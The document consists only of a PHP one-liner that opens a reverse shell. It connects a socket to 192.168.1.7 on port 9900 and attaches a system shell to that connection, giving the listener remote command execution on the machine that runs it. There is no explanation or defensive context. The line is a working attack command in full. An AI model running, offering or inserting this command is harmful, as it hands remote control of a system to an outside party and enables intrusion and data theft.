php -r '$sock=fsockopen("192.168.1.7",9900);shell_exec("sh <&3 >&3 2>&3");'
